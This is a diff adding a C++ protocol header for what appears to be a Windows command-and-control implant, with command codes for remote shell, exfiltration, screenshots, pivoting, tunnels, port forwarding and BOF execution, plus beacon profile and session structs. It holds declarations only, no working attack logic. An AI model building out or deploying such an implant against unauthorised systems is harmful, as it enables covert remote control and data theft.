@@ -1,0 +1,172 @@
+#pragma once
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+
+#include <stdint.h>
+
+#include <string>
+#include <utility>
+#include <vector>
+
+namespace gopher_proto {
+
+static const uint32_t WATERMARK = 0x__WATERMARK__;
+
+enum CommandCode {
+    COMMAND_ERROR = 0,
+    COMMAND_PWD = 1,
+    COMMAND_CD = 2,
+    COMMAND_SHELL = 3,
+    COMMAND_EXIT = 4,
+    COMMAND_DOWNLOAD = 5,
+    COMMAND_UPLOAD = 6,
+    COMMAND_CAT = 7,
+    COMMAND_CP = 8,
+    COMMAND_MV = 9,
+    COMMAND_MKDIR = 10,
+    COMMAND_RM = 11,
+    COMMAND_LS = 12,
+    COMMAND_PS = 13,
+    COMMAND_KILL = 14,
+    COMMAND_ZIP = 15,
+    COMMAND_SCREENSHOT = 16,
+    COMMAND_RUN = 17,
+    COMMAND_JOB_LIST = 18,
+    COMMAND_JOB_KILL = 19,
+    COMMAND_REV2SELF = 20,
+    COMMAND_DISKS = 21,
+    COMMAND_EXFIL = 22,
+    COMMAND_GETUID = 23,
+    COMMAND_LINK = 24,
+    COMMAND_PROFILE = 25,
+    COMMAND_SLEEP = 26,
+    COMMAND_BURST = 27,
+    COMMAND_TERMINATE = 28,
+    COMMAND_UNLINK = 29,
+    COMMAND_PIVOT_EXEC = 30,
+    COMMAND_TUNNEL_START = 31,
+    COMMAND_TUNNEL_STOP = 32,
+    COMMAND_TUNNEL_PAUSE = 33,
+    COMMAND_TUNNEL_RESUME = 34,
+    COMMAND_TERMINAL_START = 35,
+    COMMAND_TERMINAL_STOP = 36,
+    COMMAND_LPORTFWD_START = 37,
+    COMMAND_LPORTFWD_STOP = 38,
+    COMMAND_RPORTFWD_START = 39,
+    COMMAND_RPORTFWD_STOP = 40,
+    COMMAND_TUNNEL_REVERSE = 41,
+    COMMAND_EXEC_BOF = 50,
+    COMMAND_EXEC_BOF_OUT = 51,
+    COMMAND_EXEC_BOF_ASYNC = 52,
+};
+
+enum PackType {
+    INIT_PACK = 1,
+    EXFIL_PACK = 2,
+    JOB_PACK = 3,
+    TUNNEL_PACK = 4,
+    TERMINAL_PACK = 5,
+    BOF_PACK = 6,
+};
+
+struct Profile {
+    uint32_t type = WATERMARK;
+    std::vector<std::string> addresses;
+    int bannerSize = 0;
+    int connTimeout = 10;
+    int connCount = 0;
+    bool useSSL = false;
+    std::vector<uint8_t> sslCert;
+    std::vector<uint8_t> sslKey;
+    std::vector<uint8_t> caCert;
+    int sleep = 0;
+    int jitter = 0;
+    int64_t killDate = 0;
+    int workStart = 0;
+    int workEnd = 0;
+};
+
+struct SessionInfo {
+    std::string process;
+    int32_t pid = 0;
+    std::string user;
+    std::string host;
+    std::string ipaddr;
+    bool elevated = false;
+    uint32_t acp = 0;
+    uint32_t oem = 0;
+    std::string os;
+    std::string osVersion;
+    std::vector<uint8_t> encryptKey;
+};
+
+struct Message {
+    int8_t type = 0;
+    std::vector<std::vector<uint8_t> > object;
+};
+
+struct Command {
+    uint32_t code = 0;
+    uint32_t id = 0;
+    std::vector<uint8_t> data;
+};
+
+struct Value {
+    enum Type {
+        TYPE_NIL,
+        TYPE_BOOL,
+        TYPE_INT,
+        TYPE_UINT,
+        TYPE_STR,
+        TYPE_BIN,
+        TYPE_ARRAY,
+        TYPE_MAP,
+    } type;
+
+    bool booleanValue;
+    int64_t intValue;
+    uint64_t uintValue;
+    std::string stringValue;
+    std::vector<uint8_t> binValue;
+    std::vector<Value> arrayValue;
+    std::vector<std::pair<std::string, Value> > mapValue;
+
+    Value();
+
+    static Value Nil();
+    static Value Bool(bool v);
+    static Value Int(int64_t v);
+    static Value Uint(uint64_t v);
+    static Value String(const std::string& v);
+    static Value Binary(const std::vector<uint8_t>& v);
+    static Value Array();
+    static Value Map();
+};
+
+bool DecodeValue(const uint8_t* data, uint32_t len, Value* out);
+bool EncodeValue(const Value& value, std::vector<uint8_t>* out);
+
+const Value* MapGet(const Value& mapValue, const char* key);
+bool ValueAsString(const Value* value, std::string* out);
+bool ValueAsBinary(const Value* value, std::vector<uint8_t>* out);
+bool ValueAsBool(const Value* value, bool* out);
+bool ValueAsInt32(const Value* value, int32_t* out);
+bool ValueAsUInt32(const Value* value, uint32_t* out);
+bool ValueAsInt64(const Value* value, int64_t* out);
+bool ValueAsStringArray(const Value* value, std::vector<std::string>* out);
+
+bool DecodeProfile(const uint8_t* data, uint32_t len, Profile* out);
+bool EncodeSessionInfo(const SessionInfo& info, std::vector<uint8_t>* out);
+bool EncodeStartMsg(int type, const std::vector<uint8_t>& data, std::vector<uint8_t>* out);
+bool EncodeInitPack(uint32_t id, uint32_t type, const std::vector<uint8_t>& data, std::vector<uint8_t>* out);
+bool DecodeMessage(const uint8_t* data, uint32_t len, Message* out);
+bool EncodeMessage(const Message& message, std::vector<uint8_t>* out);
+bool DecodeCommand(const uint8_t* data, uint32_t len, Command* out);
+bool EncodeCommand(const Command& command, std::vector<uint8_t>* out);
+
+int TcpSendMsg(SOCKET sock, const uint8_t* data, uint32_t len);
+int TcpRecvMsg(SOCKET sock, std::vector<uint8_t>* out);
+
+} // namespace gopher_proto
